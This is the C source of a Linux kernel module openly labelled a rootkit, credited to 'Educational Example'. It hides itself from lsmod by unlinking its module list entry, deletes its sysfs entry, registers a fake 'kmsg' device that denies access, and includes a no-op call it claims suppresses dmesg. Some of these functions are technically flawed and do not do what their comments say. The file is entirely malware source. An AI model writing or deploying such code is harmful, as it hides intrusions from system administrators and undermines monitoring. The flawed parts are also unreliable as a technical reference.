#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <asm/paravirt.h>

// Kernel structure for module hiding
extern struct list_head modules;

// Hide module from lsmod
static void hide_from_lsmod(void) {
    list_del_init(&THIS_MODULE->list);
}

// Hide from /sys/module
static void hide_from_sysfs(void) {
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

// Restrict access to /dev/kmsg
static int fake_kmsg_open(struct inode *inode, struct file *filp) {
    return -EACCES;  // Deny access
}

static const struct file_operations fake_kmsg_fops = {
    .owner = THIS_MODULE,
    .open = fake_kmsg_open,
};

static struct miscdevice fake_kmsg_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "kmsg",
    .fops = &fake_kmsg_fops,
};

// Hide kernel messages
static void hide_from_kmsg(void) {
    misc_register(&fake_kmsg_device);
}

// Hide from dmesg (prevent logging)
static void suppress_dmesg(void) {
    printk(KERN_CONT "");
}

// Initialize the rootkit
static int __init rootkit_init(void) {
    hide_from_lsmod();
    hide_from_sysfs();
    hide_from_kmsg();
    suppress_dmesg();
    return 0;
}

// Cleanup (optional)
static void __exit rootkit_exit(void) {
    misc_deregister(&fake_kmsg_device); // Restore /dev/kmsg access
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Educational Example");
